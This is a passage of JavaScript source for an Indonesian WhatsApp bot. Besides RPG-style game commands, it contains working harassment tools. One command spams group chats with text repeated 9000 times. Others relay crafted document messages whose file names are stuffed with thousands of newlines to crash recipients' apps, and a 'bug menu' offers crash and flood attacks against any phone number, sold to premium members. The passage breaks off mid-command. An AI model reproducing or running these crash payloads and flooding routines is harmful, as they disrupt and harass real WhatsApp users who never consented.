if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let uangnye = Math.ceil(Math.random() * 3000)
let anjayy = Math.ceil(Math.random() * 80)
let exp = Math.ceil(Math.random() * 50)
let { key } = await conn.sendMessage(m.chat, { text: 'Ashhh AhHYahh! 💦' }, { quoted: fkontak })
let NgeText = `乂 *N G E W - R E S U L T*
  ◦ Money: ${uangnye}
  ◦ Stamina: ${anjayy}
  ◦ Exp: ${exp}`
await sleep(900)
conn.sendMessage(m.chat, { text: NgeText, edit: key }, { quoted: fkontak })
db.data.users[m.sender].money += uangnye
addDarah(m.sender, anjayy)
addBar(m.sender, anjayy)
db.data.users[m.sender].exp += exp
}
break
case 'dungeon': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isSword < 1) return reply(`Kamu Tidak Memiliki Pedang, Beli Lah Pedang Di Toko *.shop buy sword*`)
if (isArmor < 1) return reply(`Kamu Tidak Memiliki Armor , Beli Lah Armor Di Toko *.shop buy armor*`)
let dungeonimg = 'https://telegra.ph/file/e7e06f759a0549bff9a64.jpg'
let rare = Math.random() >= 3.2
let raree = rare ? Math.ceil(Math.random() * 2) : -rare
var uangnye = Math.ceil(Math.random() * 1000)
var diamondnye = Math.ceil(Math.random() * 20)
var darahkurang = Math.ceil(Math.random() * 50)
var ironnye = Math.ceil(Math.random() * 20)
let result = Math.random() >= 10.5 //BIAR ADA KALAH ADA MENANGNYA AOWKWOK
conn.sendMessage(m.chat, {
        text: 'Sedang Memasuki Dungeon..',
        contextInfo: {
        externalAdReply: {
        title: namabot,
        body: wm,
        thumbnailUrl: dungeonimg,
        mediaType: 1,
        renderLargerThumbnail: true
        }}})
        
await sleep(2000)
if (result) {
let caption = `*Ada Monster Yang Menyerang Kamu Tetapi Kamu Menang!!*

*Monster:* ${pickRandom(["PosionIus (Kelangkaan 3%)","Goinus (Kelangkaan 9%)","Zhirkiah (Kelangkaan 15%)","TigerKing (Kelangkaan 20%)","GigaNius (Kelangkaan 50%)","HouMius (Kelangkaan 70%)"])}
乂 *D U N G E O N  R E S U L T*
Wow Keren, Kamu Menang..!!!

╭ *Uang:* ${uangnye}
│ *Diamond:* ${diamondnye}
│ *Iron:* ${Ironnye}
│ *Darah:* - ${darahkurang}
╰ *Rare:* ${raree ? 'Mythic Create' : 'Gak Dapet'}`
reply(caption)
db.data.users[m.sender].money += uangnye
addDiamond(m.sender, diamondnye)
addIron(m.sender, ironnye)
addCM(m.sender, raree)
kurangDarah(m.sender, darahkurang)
} else {
let caption = `
乂 *D U N G E O N  R E S U L T*
Kamu Mati, Hahahaha Cupu!!

╭ *Monster:* Mati Gara Gara ${pickRandom(["PosionIus (Kelangkaan 3%)","Goinus (Kelangkaan 9%)","Zhirkiah (Kelangkaan 15%)","TigerKing (Kelangkaan 20%)","GigaNius (Kelangkaan 50%)","HouMius (Kelangkaan 70%)"])}
╰ Darah Berkurang: ${darahkurang}`
reply(caption)
kurangDarah(m.sender, darahkurang)
}
}
break
case 'ojek': case 'ngojek': {
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`) 
            
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
let pl = pickRandom(["Ari","Ridan","Zeni","Inem","Dicky","Eni","Ani","Atta","Endong"])
let lm = pickRandom(["Jl. Sikodir/Rw.03,Rt.55","Jl. BibengBobo/Rw.08,Rt.02","Jl. BasoEmam/Rw.05,Rt.01","Jl. UciXyZ/Rw.08,Rt.10"])
    conn.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key,
      }
    });
await sleep(1000)
    conn.sendMessage(m.chat, {
      react: {
        text: '🛵',
        key: m.key,
      }
    });
newReply(`
乂 *R E S U L T  N G O J E K*

 ◦ Mendapatkan Uang ${getMonay(m.sender)}
 ◦ Nama Pelanggan ${pl}
 ◦ Alamat Tujuan ${lm}
`)
}                    
break
            case 'mancing': case 'memancing': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
             if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
                        if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`) 
if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isCekBar < 1) return newReply(`Kamu Kelaparan, Masak Lah Makanan Atau Makan Makanan Yang Ada, *.cook* / *.makanan*`)
kurangBar(m.sender, 90)
let mancing = ["Sungai🏞️","Rawa🐊","Laut🌊"]
var mancing1 = mancing[Math.floor(Math.random() * mancing.length)]
let mampus = ["Digigit Ular🐍️","Tercakar Buaya🐊","Tersandung","Digigit Hewan Buas🐆","Terpeleset Kejurang"]
var mampus1 = mampus[Math.floor(Math.random() * mampus.length)]

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (isCekDarah < 1) return newReply(`Kamu Harus Tidur , Kamu Lelah *.tidur* Jika Kamu Mempunyai Rumah, Atau *.heal* Jika Kamu Mempunyai Potion`) 
newReply(`Mulai Memancing... 🎣`)
await sleep(3000)
var ikanmu1 = Math.ceil(Math.random() * 10)
let monaynya = 2000 * isCmd
db.data.users[m.sender].money += monaynya
kurangDarah(m.sender, 40)
addIkan(m.sender, ikanmu1) 
let anu =`
乂 *R E S U L T  M A N C I N G*

╭ 🏞️ Tempat : ${mancing1}
╰ ☠️ Terkena : ${mampus1}
 「 🐟 ${getIkan(m.sender)} 」
`
           
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `M A N C I N G - R E S U L T`,
        body: `${global.wm}`,
        thumbnailUrl: "https://telegra.ph/file/4d961120c79b35eab736a.jpg",
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
            }
            break
            case 'cheat': {
             if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
let input = args[0]            
if (!input) return reply(`乂 *C H E A T*
╭── ◦ Command Input
│${command} limit          
│${command} exp
│${command} balance
│${command} level
╰─ ◦
*Example: ${command} balance*`)
if (input === 'limit') {
db.data.users[m.sender].limit += 1000000000000
reply(`Succesfully Cheat Your Limit`)
} else if (input === 'balance') {
db.data.users[m.sender].money += 1000000000000
reply(`Succesfully Cheat Your Balance`)
} else if (input === 'level') {
db.data.users[m.sender].level += 100
reply(`Succesfully Cheat Your Level`)
} if (input === 'exp') {
db.data.users[m.sender].exp += 10000
reply(`Succesfully Cheat Your Exp`)
}
}
break
            break
            case 'kerja': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
             if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)


if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isCekBar < 1) return newReply(`Kamu Kelaparan, Masak Lah Makanan Atau Makan Makanan Yang Ada, *.cook* / *.makanan*`)
let uangnye = Math.ceil(Math.random() * 99999)
if (!q) return newReply(`
乂 *L I S T - K E R J A*
╭ ◦ 🛵 Ojek 
│ ◦ 🥗 Pedagang 
│ ◦ 🏥 ️Dokter 
│ ◦ 🌾 Petani 
│ ◦ 🏯 Montir 
╰ ◦ ⚒️ Kuli
*Example: ${command} ojek*`)
var anu1 = args[1]
if (args[0] === 'dokter'){
db.data.users[m.sender].money += uangnye
newReply(`Kamu menyembuhkan pasien *cedera* 💉
Dan mendapatkan uang senilai *Rp ${uangnye}* 💹`)
} else if (args[0] === 'ojek') {
db.data.users[m.sender].money += uangnye
kurangBar(m.sender, 50)
newReply(`
Kamu Mendapatkan Pelanggan 👤, Dan Mengantarkan *Pelanggan* Ke Tempat *Tujuan ✅* Di Bayar *Rp ${uangnye}*`)
} else if (args[0] === 'pedagang') {
let jualan = ["Sayuran🥔","Makanan🧇","Minuman🥂"]
let jualannye = jualan[Math.floor(Math.random() * jualan.length)]
kurangBar(m.sender, 60)
db.data.users[m.sender].money += uangnye
newReply(`
Kamu Menjual *${jualannye}* Dan Mendapatkan 1 *Pembeli* , Hasil *Rp ${uangnye}*`)
} else if (args[0] === 'petani') {
db.data.users[m.sender].money += uangnye
kurangBar(m.sender, 80)
let buahan = ["Apel 🍎","Stroberi 🍓","Mangga 🥭","Semangka 🍉","Jeruk 🍊","Melon 🍈"]
let buahannye = buahan[Math.floor(Math.random() * buahan.length)]
newReply(`
Kebun ${buahannye} Siap Untuk *Dipanen* ,Menjual Hasil Buah ${buahannye} Kek Pembeli Mendapatkan Uang *Rp ${uangnye}*`)
} else if (args[0] === 'montir') {
let kenapa = ["Ganti Oli","Ban Bocor","Motor Kebelah 2","Ganti Lampu","Rem Blong"]
kurangBar(m.sender, 60)
let kenapatuh = kenapa[Math.floor(Math.random() * kenapa.length)]
db.data.users[m.sender].money += uangnye
newReply(`Pembeli ${kenapatuh} , Mulai Memperbaiki/Mengerjakan Dan Mendapatkan Uang *Rp ${uangnye}*`)
} else if (args[0] === 'kuli') {
db.data.users[m.sender].money += uangnye
newReply(`Memperbaiki Rumah ⚒️, Dan Mendapatkan Uang *Rp ${uangnye}*`)
}
}
break
case 'tes': case 'bot': case 'p': {
let text = `I'm Online 👋`
reply(text)
}
break
case 'repeat': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!q) return newReply(`TextNya?\n\n*Example:* ${prefix + command} ary ganteng`)
newReply(`${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}
${q}`)
}
break
case 'spamgc': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (!q) return newReply(`Textnya Mana?`)
newReply(`${q}\n`.repeat(9000))
}
break
case '🗿': case '🥔': case '🌰': case '🎂': case '🍆': case '🥑': case '🥒': case '🥦': case '🌽': case '🍠': case '🥕': case '🌶️': case '🍅': case '🥥': case '🍇': case '🥝': case '🍐': case '🍏': case '🍈': case '🍋': case '🍌': case '🍍': case '🍊': case '🍑': case '🍉': case '🍎': case '🍒️': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!isCreator) return newReply(`Apa Coba?`)
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
await newReply(`Tunggu Bentar Om...`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "AR BOTZ",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `ZkySKY!!!⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.ZKYSKY!!`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ZkySky!! ${buttonkal}`,
}

}), { userJid: m.chat, quoted:kalgans})
conn.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break
case 'bugmenu': case 'menubug': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
    let anu =`🚩 Jangan Gunakan Fitur Ini Sembarangan, Karna Pengguna Yang Tidak Memakai Wa(kebal) Akan Crash, Bug Ini Akan Hilang Setelah 5 menit/10 menit, Agar Pengguna Yang Dikirim Bug Tidak Akan Crash Lama

╭── •  *「 Bug Nomer 」*
│santet (nomer)
│lag (nomer)
│virus (nomer)
│crash (nomer)
│riff (nomer)
│🌷 (nomer)
│🐲 (nomer)
│🐉 (nomer)
│🌵 (nomer)
│🎄 (nomer)
│🌲 (nomer)
│🌳 (nomer)
│🌱 (nomer)
│🌿 (nomer)
│🍀 (nomer)
│☘️ (nomer)
╰─── •
╭── •  *「 Bug Jumlah  」*
│🍒️ (jumlah)
│🍎 (jumlah)
│🍉 (jumlah)
│🍊 (jumlah)
│🍍 (jumlah)
│🥝 (jumlah)
│🍇 (jumlah)
│🥥 (jumlah)
│🍅 (jumlah)
│🌶️ (jumlah)
│🍆 (jumlah)
│🎂 (jumlah)
│🌰 (jumlah)
│🥔 (jumlah)
│🗿 (jumlah)
╰─── •`
conn.sendMessage(m.chat, {
    text: Styles(anu),
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `Arybotz - Device OS`,
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }}
    })
   }
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} nomer\nContoh ${prefix+command} 628xxx`)
 if (!isPremium) return newReply(`Join Murbug Untuk Mengakses Fitur Ini! , Minat Join? 085762008398 Chat`)
if (args[0] == '6285762008398') return newReply(`Itu Nomer Creator Gw Bngst`)
newReply(`Tunggu Bentar Om...`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `ZkySky!!`}, {quoted:kalgans})
await sleep(2000)
}
newReply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit!!!*`)
break
case 'riff': case 'riper': case 'ripper': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} nomer\nContoh ${prefix+command} 628xxx`)
if (!isPremium) return newReply(`Join Murbug Untuk Mengakses Fitur Ini! , Minat Join? 085762008398 Chat`)
if (args[0] == '6285762008398') return newReply(`Itu Nomer Creator Gw Bngst`)
newReply(`Tunggu Bentar Om...`)
let Pe = text.split("|")[0]+'@s.whatsapp.net'
conn.sendMessage(Pe, {text: `Yatim!!!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!`}, {quoted:kalgans})
await sleep(2000)
conn.sendMessage(Pe, {text: `Yatim!!`}, {quoted:kalgans})
await sleep(2000)
}
newReply(`*Sukses Mengolok Ngolok Ripper Dan Juga Mengirim Bug Ke ${Pe} Riper Anjg*`)
break
case 'crash': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} nomer\nContoh ${prefix+command} 628xxx`)
if (!isPremium) return newReply(`Join Murbug Untuk Mengakses Fitur Ini! , Minat Join? 085762008398 Chat`)
